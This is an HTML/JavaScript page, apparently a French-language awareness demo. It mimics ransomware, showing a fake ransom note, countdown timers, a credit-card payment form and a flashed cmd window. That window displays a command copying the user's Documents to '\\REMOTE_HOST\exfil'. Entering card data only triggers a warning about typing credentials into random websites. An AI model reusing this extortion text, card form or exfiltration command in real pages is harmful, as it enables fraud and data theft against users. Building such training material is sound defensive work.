<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ALERTE SÃ‰CURITÃ‰</title>
    <style>
        :root {
            --maroon:      #6B0000;
            --dark-maroon: #3a0000;
            --crimson:     #8B0000;
            --yellow:      #FFD700;
            --white:       #FFFFFF;
            --lcd-green:   #00FF41;
            --lcd-bg:      #001a00;
            --btn-face:    #D4D0C8;
            --btn-shadow:  #808080;
            --btn-dark:    #404040;
            --btn-light:   #FFFFFF;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #000; font-family: Tahoma, Arial, sans-serif; font-size: 13px; overflow: hidden; height: 100vh; color: var(--white); }

        /* â”€â”€ FB snapshot â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        #fake-fb { position: fixed; inset: 0; background: #F0F2F5; display: flex; flex-direction: column; z-index: 100; }
        .fb-header { height: 60px; background: white; border-bottom: 1px solid #ddd; }
        .fb-post { width: 500px; height: 400px; background: white; margin: 40px auto; border-radius: 8px; padding: 20px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
        .fb-placeholder { background: #eee; height: 20px; margin-bottom: 15px; border-radius: 4px; }

        /* â”€â”€ Initial glitch overlay â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        .glitch-overlay { position: fixed; inset: 0; background: transparent; z-index: 101; pointer-events: none; display: none; }
        .glitch-active .glitch-overlay { display: block; animation: glitch-anim 0.15s infinite; }
        @keyframes glitch-anim {
            0%   { clip-path: inset(10% 0 30% 0); transform: translateX(-6px); filter: invert(1) hue-rotate(180deg); }
            50%  { clip-path: inset(50% 0 10% 0); transform: translateX(6px);  filter: invert(0); }
            100% { clip-path: inset(20% 0 60% 0); transform: translateX(-3px); filter: sepia(1); }
        }

        /* â”€â”€ Trop Tard â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        #trop-tard { position: fixed; inset: 0; background: black; z-index: 102; display: none; justify-content: center; align-items: center; color: #FF0000; font-family: 'Courier New', monospace; font-size: 2.5rem; font-weight: bold; letter-spacing: 8px; opacity: 0; text-shadow: 0 0 40px rgba(255,0,0,0.9); }

        /* â”€â”€ CMD Window â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        #cmd-window { position: fixed; bottom: 60px; right: 60px; width: 530px; background: #0C0C0C; border: 1px solid #555; z-index: 9500; font-family: 'Courier New', monospace; font-size: 12px; color: #CCC; box-shadow: 4px 4px 20px rgba(0,0,0,0.95); display: none; }
        .cmd-titlebar { background: #1a1a1a; padding: 5px 8px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #333; }
        .cmd-title-left { font-size: 11px; color: #bbb; display: flex; align-items: center; gap: 6px; }
        .cmd-controls { display: flex; }
        .cmd-ctrl { width: 46px; height: 22px; display: flex; align-items: center; justify-content: center; font-size: 10px; color: #ccc; }
        .cmd-ctrl.close:hover { background: #c42b1c; color: white; }
        .cmd-body { padding: 8px 12px; line-height: 1.75; min-height: 130px; }
        .cmd-gray { color: #AAA; } .cmd-white { color: #FFF; } .cmd-green { color: #00FF41; } .cmd-prompt { color: #CCC; }

        /* â•â• MAIN UI â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */
        #main-ui { position: fixed; inset: 0; display: none; opacity: 0; background: var(--dark-maroon); overflow-y: auto; transition: opacity 0.6s ease; }
        #main-ui::after { content: ''; position: fixed; inset: 0; pointer-events: none; z-index: 50; background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.04) 2px, rgba(0,0,0,0.04) 4px); }

        .xp-window { width: 820px; max-width: 98vw; margin: 30px auto; background: var(--crimson); border: 2px solid var(--maroon); box-shadow: inset 1px 1px 0 rgba(255,255,255,0.15), inset -1px -1px 0 rgba(0,0,0,0.4), 4px 4px 0 #000; }

        .xp-titlebar { background: linear-gradient(180deg, #9B0000 0%, #5a0000 100%); padding: 5px 8px; display: flex; align-items: center; justify-content: space-between; border-bottom: 2px solid #3a0000; user-select: none; }
        .xp-title-left { display: flex; align-items: center; gap: 8px; }
        .xp-title-icon { font-size: 14px; }
        .xp-title-text { font-family: Tahoma, Arial; font-size: 12px; font-weight: bold; color: white; letter-spacing: 0.5px; }
        .xp-title-controls { display: flex; gap: 2px; }
        .xp-btn-ctrl { width: 18px; height: 16px; background: var(--btn-face); border-top: 1px solid var(--btn-light); border-left: 1px solid var(--btn-light); border-right: 1px solid var(--btn-dark); border-bottom: 1px solid var(--btn-dark); font-size: 9px; font-weight: bold; color: #000; display: flex; align-items: center; justify-content: center; cursor: default; }
        .xp-btn-ctrl:hover { background: #c42b1c; color: white; }

        .wanna-header { background: var(--maroon); padding: 16px 20px; display: flex; align-items: center; gap: 20px; border-bottom: 3px solid #2a0000; }
        .lock-icon { width: 70px; height: 70px; background: linear-gradient(135deg, #cc0000, #660000); border: 3px solid #ff4444; border-radius: 4px; display: flex; align-items: center; justify-content: center; font-size: 36px; flex-shrink: 0; animation: lock-pulse 2s ease-in-out infinite; }
        @keyframes lock-pulse { 0%,100% { box-shadow: inset 0 0 10px rgba(0,0,0,0.5), 0 0 0 0 rgba(255,0,0,0.4); } 50% { box-shadow: inset 0 0 10px rgba(0,0,0,0.5), 0 0 0 8px rgba(255,0,0,0); } }
        .header-text h1 { font-size: 22px; font-weight: bold; color: var(--yellow); font-family: Tahoma, Arial; text-shadow: 1px 1px 0 #000; margin-bottom: 4px; }
        .header-text .sub { font-size: 12px; color: #ffaaaa; }

        .wanna-body { display: flex; min-height: 380px; }
        .left-panel { width: 220px; flex-shrink: 0; background: var(--dark-maroon); border-right: 2px solid #2a0000; padding: 14px; display: flex; flex-direction: column; gap: 12px; }
        .timer-box { background: #1a0000; border: 2px inset #3a0000; padding: 10px; }
        .timer-label { font-size: 10px; color: var(--yellow); text-align: center; margin-bottom: 6px; font-weight: bold; letter-spacing: 0.5px; text-transform: uppercase; }
        .timer-date { font-size: 10px; color: #ff8888; text-align: center; margin-bottom: 6px; }
        .lcd-timer { font-family: 'Courier New', monospace; font-size: 22px; font-weight: bold; color: var(--lcd-green); background: var(--lcd-bg); text-align: center; padding: 6px 4px; border: 1px inset #001a00; letter-spacing: 3px; text-shadow: 0 0 8px var(--lcd-green); }
        .data-box { background: #1a0000; border: 2px inset #3a0000; padding: 10px; }
        .data-box-title { font-size: 10px; color: var(--yellow); font-weight: bold; text-transform: uppercase; margin-bottom: 8px; letter-spacing: 0.5px; }
        .data-line { font-size: 10px; color: #cccccc; margin-bottom: 4px; font-family: 'Courier New', monospace; opacity: 0; transition: opacity 0.3s ease; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        .data-line.show { opacity: 1; }
        .data-val { color: #00FF41; }
        .progress-box { background: #1a0000; border: 2px inset #3a0000; padding: 10px; }
        .prog-label { font-size: 10px; color: var(--yellow); font-weight: bold; text-transform: uppercase; margin-bottom: 6px; letter-spacing: 0.5px; }
        .prog-bar-container { width: 100%; height: 14px; background: #000; border: 1px inset #333; }
        .prog-bar-fill { height: 100%; width: 0%; background: repeating-linear-gradient(45deg, #ff0000, #ff0000 4px, #cc0000 4px, #cc0000 8px); transition: width 3s linear; }
        .prog-percent { font-size: 10px; color: #ff4444; text-align: right; margin-top: 3px; font-family: 'Courier New', monospace; }

        .right-panel { flex: 1; background: var(--crimson); padding: 16px 18px; overflow-y: auto; max-height: 440px; }
        .right-panel::-webkit-scrollbar { width: 14px; }
        .right-panel::-webkit-scrollbar-track { background: #3a0000; border: 1px solid #2a0000; }
        .right-panel::-webkit-scrollbar-thumb { background: var(--btn-face); border: 1px solid var(--btn-shadow); }
        .ransom-section { margin-bottom: 16px; }
        .ransom-section h2 { font-size: 13px; font-weight: bold; color: var(--yellow); margin-bottom: 6px; font-family: Tahoma, Arial; border-bottom: 1px solid rgba(255,215,0,0.3); padding-bottom: 3px; }
        .ransom-section p { font-size: 12px; color: #f0c0c0; line-height: 1.6; }
        .ransom-section p strong { color: var(--yellow); }
        .ransom-highlight { background: #4a0000; border-left: 3px solid var(--yellow); padding: 8px 10px; margin: 8px 0; font-size: 12px; color: var(--yellow); font-weight: bold; }

        /* â”€â”€ CC Form â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        .payment-bar { background: #1e0000; border-top: 3px solid #3a0000; padding: 14px 16px; }
        .cc-form-title { font-size: 11px; color: var(--yellow); font-weight: bold; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 10px; display: flex; align-items: center; gap: 8px; }
        .cc-form-title .card-icons { display: flex; gap: 4px; }
        .card-icon { background: var(--btn-face); border-radius: 2px; padding: 1px 5px; font-size: 10px; color: #000; font-weight: bold; font-family: Arial; }
        .card-icon.visa { background: #1a1f71; color: #fff; }
        .card-icon.mc   { background: #eb001b; color: #fff; }
        .cc-row { display: flex; gap: 8px; margin-bottom: 8px; }
        .cc-field { display: flex; flex-direction: column; flex: 1; }
        .cc-field.xnarrow { flex: 0 0 90px; }
        .cc-label { font-size: 9px; color: #ffaaaa; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 3px; font-family: Tahoma, Arial; }
        .cc-input { background: #0a0a0a; border-top: 1px solid var(--btn-dark); border-left: 1px solid var(--btn-dark); border-right: 1px solid var(--btn-light); border-bottom: 1px solid var(--btn-light); padding: 4px 7px; font-family: 'Courier New', monospace; font-size: 12px; color: #00FF41; outline: none; width: 100%; letter-spacing: 1px; }
        .cc-input::placeholder { color: #2a4a2a; font-size: 11px; }
        .cc-input:focus { border-color: var(--yellow); color: var(--yellow); }
        .cc-submit-row { display: flex; align-items: center; justify-content: space-between; margin-top: 10px; }
        .cc-disclaimer { font-size: 9px; color: #884444; font-style: italic; max-width: 400px; line-height: 1.4; }
        .win-btn { background: var(--btn-face); border-top: 2px solid var(--btn-light); border-left: 2px solid var(--btn-light); border-right: 2px solid var(--btn-dark); border-bottom: 2px solid var(--btn-dark); padding: 6px 22px; font-size: 12px; font-family: Tahoma, Arial; color: #000; cursor: pointer; white-space: nowrap; font-weight: bold; }
        .win-btn:hover { background: #e0dcd4; }
        .win-btn.submit { background: #8B0000; color: var(--yellow); border-color: #ff4444; }
        .win-btn.submit:hover { background: #aa0000; }

        .fade-out-white { position: fixed; inset: 0; background: white; z-index: 2000; display: none; opacity: 0; }

        /* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
           CREDENTIAL BREACH GLITCH
           KEY FIX: `animation-fill-mode: forwards` makes it run ONCE
           for exactly 800ms then freeze at the final keyframe (no filter,
           no transform). No class removal needed â€” it just stops cleanly.
           The old `infinite` caused it to loop forever and fight any
           attempt to show the guardian or redirect.
        â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */
        @keyframes cred-shake {
            0%   { transform: translate(0,0)        skewX(0deg);    filter: none; }
            10%  { transform: translate(-12px, 6px)  skewX(-2deg);   filter: invert(0.8) hue-rotate(90deg); }
            20%  { transform: translate(12px, -6px)  skewX(2deg);    filter: saturate(8) contrast(2.5); }
            30%  { transform: translate(-10px, 5px)  skewX(-1.5deg); filter: invert(0.6) hue-rotate(180deg); }
            42%  { transform: translate(10px, -4px)  skewX(1.5deg);  filter: brightness(2.5); }
            54%  { transform: translate(-7px, 3px)   skewX(-1deg);   filter: hue-rotate(270deg) saturate(5); }
            66%  { transform: translate(5px, -2px)   skewX(0.5deg);  filter: invert(0.4); }
            78%  { transform: translate(-3px, 1px);                  filter: brightness(0.4); }
            90%  { transform: translate(2px, -1px);                  filter: none; }
            100% { transform: translate(0, 0);                       filter: none; }
        }

        /* Single-shot: runs once, stops, no class removal needed */
        .cred-breach {
            animation: cred-shake 0.8s ease forwards;
        }

        /* â”€â”€ Guardian Modal â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        #guardian-modal {
            position: fixed; inset: 0;
            z-index: 99999;
            display: flex; justify-content: center; align-items: flex-end;
            pointer-events: none;
            opacity: 0;
            transition: opacity 0.4s ease;
        }
        #guardian-modal.show {
            opacity: 1;
            pointer-events: auto;
        }
        .guardian-wrap {
            position: relative;
            margin-bottom: 30px;
            animation: guardian-pop 0.5s ease;
        }
        #guardian-img {
            width: 260px;
            filter: drop-shadow(0 0 20px rgba(0,0,0,0.7));
        }
        .guardian-bubble {
            position: absolute;
            bottom: 220px; left: 220px;
            background: white; color: #000;
            padding: 14px 18px; border-radius: 16px;
            font-family: Tahoma, Arial; font-size: 14px;
            max-width: 460px;
            box-shadow: 0 6px 20px rgba(0,0,0,0.4);
            /* Slight delay so image lands before bubble pops */
            animation: bubble-pop 0.4s ease 0.15s both;
        }
        .guardian-bubble::after {
            content: '';
            position: absolute; bottom: -12px; left: 24px;
            border-width: 12px; border-style: solid;
            border-color: white transparent transparent transparent;
        }
        @keyframes guardian-pop {
            from { transform: translateY(80px) scale(0.8); opacity: 0; }
            to   { transform: translateY(0)    scale(1);   opacity: 1; }
        }
        @keyframes bubble-pop {
            from { transform: scale(0.7); opacity: 0; }
            to   { transform: scale(1);   opacity: 1; }
        }
    </style>
</head>
<body class="glitch-active">

    <div id="fake-fb">
        <div class="fb-header"></div>
        <div class="fb-post">
            <div class="fb-placeholder" style="width:40%;"></div>
            <div class="fb-placeholder" style="width:90%; height:200px;"></div>
            <div class="fb-placeholder" style="width:70%;"></div>
            <div class="fb-placeholder" style="width:30%; height:40px; margin-top:20px;"></div>
        </div>
    </div>

    <div class="glitch-overlay"></div>
    <div id="trop-tard">Trop tard.</div>

    <div id="cmd-window">
        <div class="cmd-titlebar">
            <div class="cmd-title-left"><span>â¬›</span><span>C:\Windows\System32\cmd.exe</span></div>
            <div class="cmd-controls">
                <div class="cmd-ctrl">&#8722;</div><div class="cmd-ctrl">&#9633;</div>
                <div class="cmd-ctrl close">&#10005;</div>
            </div>
        </div>
        <div class="cmd-body">
            <div class="cmd-gray">Microsoft Windows [Version 10.0.19045.4170]</div>
            <div class="cmd-gray">(c) Microsoft Corporation. Tous droits rÃ©servÃ©s.</div><br>
            <div><span class="cmd-prompt">C:\Users\Mohamed&gt; </span><span class="cmd-white">ipconfig /all</span></div>
            <div class="cmd-green">Adresse IPv4 . . . . . . : 197.0.XXX.XXX</div>
            <div class="cmd-green">Passerelle par dÃ©faut. . : 192.168.1.1</div><br>
            <div><span class="cmd-prompt">C:\Users\Mohamed&gt; </span><span class="cmd-white">copy C:\Users\Mohamed\Documents\* \\REMOTE_HOST\exfil /Y</span></div>
            <div class="cmd-green">127 fichier(s) copiÃ©(s).</div><br>
            <div><span class="cmd-prompt">C:\Users\Mohamed&gt; </span><span class="cmd-white">_</span></div>
        </div>
    </div>

    <div id="main-ui">
        <div class="xp-window">
            <div class="xp-titlebar">
                <div class="xp-title-left">
                    <span class="xp-title-icon">ğŸ”’</span>
                    <span class="xp-title-text">CyberTrap Decrypt0r 1.0 â€” Vos fichiers ont Ã©tÃ© chiffrÃ©s</span>
                </div>
                <div class="xp-title-controls">
                    <div class="xp-btn-ctrl">â”€</div><div class="xp-btn-ctrl">â–¡</div><div class="xp-btn-ctrl">âœ•</div>
                </div>
            </div>

            <div class="wanna-header">
                <div class="lock-icon">ğŸ”’</div>
                <div class="header-text">
                    <h1>Ooops, vos fichiers ont Ã©tÃ© chiffrÃ©s !</h1>
                    <div class="sub">Toutes vos donnÃ©es personnelles sont dÃ©sormais sous notre contrÃ´le. Lisez attentivement.</div>
                </div>
            </div>

            <div class="wanna-body">
                <div class="left-panel">
                    <div class="timer-box">
                        <div class="timer-label">âš ï¸ Le prix augmente dans</div>
                        <div class="timer-date" id="raise-date"></div>
                        <div class="lcd-timer" id="timer-raise">00:00:00</div>
                    </div>
                    <div class="timer-box">
                        <div class="timer-label" style="color:#ff6666;">ğŸ’€ Vos fichiers seront dÃ©truits dans</div>
                        <div class="timer-date" id="destroy-date"></div>
                        <div class="lcd-timer" id="timer-destroy" style="color:#ff4444; text-shadow: 0 0 8px #ff0000;">00:00:00</div>
                    </div>
                    <div class="data-box">
                        <div class="data-box-title">ğŸ¯ DonnÃ©es collectÃ©es</div>
                        <div class="data-line" id="d1">IP: <span class="data-val" id="dip">â€¦</span></div>
                        <div class="data-line" id="d2">Ville: <span class="data-val" id="dcity">â€¦</span></div>
                        <div class="data-line" id="d3">FAI: <span class="data-val" id="disp">â€¦</span></div>
                        <div class="data-line" id="d4">OS: <span class="data-val" id="dos">â€¦</span></div>
                        <div class="data-line" id="d5">Ã‰cran: <span class="data-val" id="dres">â€¦</span></div>
                    </div>
                    <div class="progress-box">
                        <div class="prog-label">ğŸ“¤ Exfiltration en cours</div>
                        <div class="prog-bar-container"><div class="prog-bar-fill" id="prog-fill"></div></div>
                        <div class="prog-percent" id="prog-pct">0%</div>
                    </div>
                </div>

                <div class="right-panel">
                    <div class="ransom-section">
                        <h2>Qu'est-il arrivÃ© Ã  votre appareil ?</h2>
                        <p>En cliquant sur ce lien, vous avez exÃ©cutÃ© un script malveillant. <strong>Tous vos fichiers importants</strong> â€” documents, photos, vidÃ©os, contacts WhatsApp â€” ont Ã©tÃ© chiffrÃ©s avec un algorithme <strong>AES-256</strong> de niveau militaire.</p>
                        <div class="ransom-highlight">âš ï¸ Ne redÃ©marrez pas votre appareil. Ne tentez pas de supprimer ce programme. Vous perdriez tout.</div>
                    </div>
                    <div class="ransom-section">
                        <h2>Puis-je rÃ©cupÃ©rer mes fichiers ?</h2>
                        <p>Oui â€” mais seulement si vous payez avant l'expiration du dÃ©lai. <strong>Vous avez 72 heures.</strong> AprÃ¨s ce dÃ©lai, le prix double. AprÃ¨s 7 jours, vos fichiers seront <strong>dÃ©finitivement supprimÃ©s</strong>.</p>
                        <p style="margin-top:8px;">Nous avons dÃ©jÃ  rÃ©cupÃ©rÃ© : vos <strong>photos personnelles</strong>, votre <strong>historique de navigation</strong>, vos <strong>mots de passe enregistrÃ©s</strong>, et vos <strong>conversations WhatsApp</strong>.</p>
                    </div>
                    <div class="ransom-section">
                        <h2>Comment payer ?</h2>
                        <p>Le paiement est acceptÃ© <strong>par carte bancaire uniquement</strong> (Visa, Mastercard, CIB). Payez <strong style="color:#FFD700; font-size:14px;">500 TND</strong> pour recevoir la clÃ© de dÃ©chiffrement immÃ©diatement.</p>
                        <div class="ransom-highlight">ğŸ’€ Chaque heure de retard = 127 fichiers supplÃ©mentaires supprimÃ©s dÃ©finitivement.</div>
                    </div>
                    <div class="ransom-section">
                        <h2>Contactez-nous</h2>
                        <p style="color:#ffaaaa; font-size:11px;">
                            Si vous pensez qu'il s'agit d'une erreur : <strong style="color:#FFD700;">decrypt0r@protonmail.com</strong><br>
                            ID unique : <span style="font-family:'Courier New'; color:#00FF41;" id="unique-id">GENERATING...</span>
                        </p>
                    </div>
                </div>
            </div>

            <!-- Credit Card Form -->
            <div class="payment-bar">
                <div class="cc-form-title">
                    ğŸ’³ Paiement requis pour dÃ©chiffrer vos fichiers â€” 500 TND
                    <div class="card-icons">
                        <span class="card-icon visa">VISA</span>
                        <span class="card-icon mc">MC</span>
                        <span class="card-icon">CIB</span>
                    </div>
                </div>
                <div class="cc-row">
                    <div class="cc-field">
                        <div class="cc-label">Titulaire de la carte</div>
                        <input class="cc-input" type="text" placeholder="MOHAMED TRABELSI" maxlength="26" autocomplete="off">
                    </div>
                </div>
                <div class="cc-row">
                    <div class="cc-field">
                        <div class="cc-label">NumÃ©ro de carte</div>
                        <input class="cc-input" id="cc-number" type="text" placeholder="0000  0000  0000  0000" maxlength="19" autocomplete="off">
                    </div>
                    <div class="cc-field xnarrow">
                        <div class="cc-label">Date d'expiration</div>
                        <input class="cc-input" type="text" placeholder="MM/AA" maxlength="5" autocomplete="off">
                    </div>
                    <div class="cc-field xnarrow">
                        <div class="cc-label">CVV / CVC</div>
                        <input class="cc-input" id="cc-cvv" type="password" placeholder="â€¢â€¢â€¢" maxlength="3" autocomplete="off">
                    </div>
                </div>
                <div class="cc-submit-row">
                    <div class="cc-disclaimer">
                        âš ï¸ En soumettant, vous autorisez le dÃ©bit de 500 TND pour la clÃ© de dÃ©chiffrement.
                        Vos donnÃ©es bancaires seront traitÃ©es de maniÃ¨re "sÃ©curisÃ©e".
                    </div>
                    <button class="win-btn submit" id="cc-submit-btn">ğŸ”“ Payer &amp; DÃ©chiffrer</button>
                </div>
            </div>
        </div>
    </div>

    <div class="fade-out-white" id="white-out"></div>

    <!-- Guardian Modal -->
    <div id="guardian-modal">
        <div class="guardian-wrap">
            <img src="./OIG4_inspyrenet.png" id="guardian-img" alt="Beji Matrix">
            <div class="guardian-bubble">
                Fech taamel? Don't ever put your credentials in random websites!
            </div>
        </div>
    </div>

    <script>
        // â”€â”€â”€ Audio â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        let audioCtx;
        function getCtx() {
            if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            return audioCtx;
        }
        function playClick() {
            try {
                const ctx = getCtx(), o = ctx.createOscillator(), g = ctx.createGain();
                o.type = 'square';
                o.frequency.setValueAtTime(120, ctx.currentTime);
                o.frequency.exponentialRampToValueAtTime(10, ctx.currentTime + 0.08);
                g.gain.setValueAtTime(0.04, ctx.currentTime);
                g.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.08);
                o.connect(g); g.connect(ctx.destination);
                o.start(); o.stop(ctx.currentTime + 0.08);
            } catch(e) {}
        }

        // playGlitchSound was MISSING from the user's file â€” undefined call
        // was silently throwing and halting the breach sequence.
        function playGlitchSound() {
            try {
                const ctx = getCtx(), o = ctx.createOscillator(), g = ctx.createGain(), ws = ctx.createWaveShaper();
                const curve = new Float32Array(256);
                for (let i = 0; i < 256; i++) {
                    const x = (i * 2) / 256 - 1;
                    curve[i] = (Math.PI + 300) * x / (Math.PI + 300 * Math.abs(x));
                }
                ws.curve = curve;
                o.type = 'sawtooth';
                o.frequency.setValueAtTime(80, ctx.currentTime);
                o.frequency.exponentialRampToValueAtTime(10, ctx.currentTime + 0.7);
                g.gain.setValueAtTime(0.35, ctx.currentTime);
                g.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.8);
                o.connect(ws); ws.connect(g); g.connect(ctx.destination);
                o.start(); o.stop(ctx.currentTime + 0.8);
            } catch(e) {}
        }

        // â”€â”€â”€ Timers â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        function formatTime(secs) {
            const h = Math.floor(secs / 3600).toString().padStart(2,'0');
            const m = Math.floor((secs % 3600) / 60).toString().padStart(2,'0');
            const s = (secs % 60).toString().padStart(2,'0');
            return `${h}:${m}:${s}`;
        }
        function addDays(days) {
            const d = new Date(); d.setDate(d.getDate() + days);
            return d.toLocaleDateString('fr-FR');
        }

        let raiseLeft = 72 * 3600, destroyLeft = 168 * 3600;
        document.getElementById('raise-date').innerText   = addDays(3);
        document.getElementById('destroy-date').innerText = addDays(7);
        document.getElementById('unique-id').innerText    = 'TN-' + Math.random().toString(36).substring(2,10).toUpperCase();

        const timerInterval = setInterval(() => {
            if (raiseLeft > 0)   { raiseLeft--;   document.getElementById('timer-raise').innerText   = formatTime(raiseLeft); }
            if (destroyLeft > 0) { destroyLeft--;  document.getElementById('timer-destroy').innerText = formatTime(destroyLeft); }
        }, 1000);

        // â”€â”€â”€ CMD Flash â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        function flashCMD(duration = 900) {
            const cmd = document.getElementById('cmd-window');
            cmd.style.display = 'block'; cmd.style.opacity = '1';
            setTimeout(() => {
                cmd.style.transition = 'opacity 0.12s ease-out';
                cmd.style.opacity = '0';
                setTimeout(() => { cmd.style.display = 'none'; cmd.style.opacity = '1'; cmd.style.transition = ''; }, 120);
            }, duration);
        }

        // â”€â”€â”€ CC number auto-format â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        const ccNumber = document.getElementById('cc-number');
        if (ccNumber) {
            ccNumber.addEventListener('input', (e) => {
                let v = e.target.value.replace(/\D/g, '').substring(0, 16);
                e.target.value = v.replace(/(.{4})/g, '$1  ').trim();
            });
        }

        // â”€â”€â”€ Data reveal â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        function revealData(userData) {
            document.getElementById('dip').innerText   = userData.ip;
            document.getElementById('dcity').innerText = userData.city;
            document.getElementById('disp').innerText  = userData.isp.substring(0, 14);
            document.getElementById('dos').innerText   = userData.os;
            document.getElementById('dres').innerText  = userData.res;
            ['d1','d2','d3','d4','d5'].forEach((id, i) => {
                setTimeout(() => { document.getElementById(id).classList.add('show'); playClick(); }, i * 300);
            });
        }

        // â”€â”€â”€ Progress bar â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        function startProgress() {
            const fill = document.getElementById('prog-fill');
            const pct  = document.getElementById('prog-pct');
            fill.style.width = '83%';
            let p = 0;
            const pi = setInterval(() => {
                p++; pct.innerText = p + '%';
                if (p >= 83) clearInterval(pi);
            }, 38);
        }

        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        //  CREDENTIAL BREACH â€” fixed sequence
        //
        //  Timeline:
        //    t=0ms    â†’ inputs disabled, glitch sound plays, shake starts
        //    t=800ms  â†’ shake animation ends naturally (forwards, finite)
        //               timers stop, guardian slides up
        //    t=2600ms â†’ navigate to transition.html
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

        let credTriggered = false;

        function triggerCredentialBreach() {
            if (credTriggered) return;
            credTriggered = true;

            // 1. Lock all inputs immediately
            document.querySelectorAll('.cc-input').forEach(i => {
                i.disabled = true;
                i.style.color = '#ff0000';
            });
            document.getElementById('cc-submit-btn').disabled = true;

            // 2. Play distorted glitch sound
            playGlitchSound();

            // 3. Apply ONE-SHOT shake to main-ui (runs 800ms, stops, done)
            document.getElementById('main-ui').classList.add('cred-breach');

            // 4. After shake ends â†’ stop timers, show guardian
            setTimeout(() => {
                clearInterval(timerInterval);

                const modal = document.getElementById('guardian-modal');
                modal.classList.add('show');

                // 5. Navigate after guardian is readable (1.8s)
                setTimeout(() => {
                    window.location.href = 'transition.html';
                }, 1800);

            }, 800); // exactly matches animation duration
        }

        // Attach to all CC inputs + submit button
        document.querySelectorAll('.cc-input').forEach(input => {
            input.addEventListener('input', triggerCredentialBreach);
        });
        document.getElementById('cc-submit-btn').addEventListener('click', triggerCredentialBreach);

